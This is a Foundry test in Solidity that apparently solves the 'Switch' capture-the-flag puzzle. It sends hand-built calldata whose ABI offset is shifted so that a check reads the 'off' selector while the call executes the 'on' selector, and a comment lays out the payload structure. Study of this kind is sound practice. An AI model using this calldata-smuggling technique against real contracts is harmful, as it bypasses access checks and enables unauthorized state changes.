// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Switch} from "../src/Switch.sol";

contract CounterTest is Test {
    Switch public switch_;

    address contractAddress = 0x1901e31D48D2aE50A641657f9ECDeb9e88425517;

    function setUp() public {
        switch_ = new Switch();
    }

    function testSwitchOn() public {

        bytes memory data = hex"30c13ade000000000000000000000000000000000000000000000000000000000000006076227e120000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success, ) = address(switch_).call(data);

        console.log(success);

        assertTrue(switch_.switchOn());
    }
}

// flipSwitch(4 bytes) + location 0x60(32 bytes) + len(32 bytes) + data(offSelector) + len 1(32 bytes) + data(onSelector)

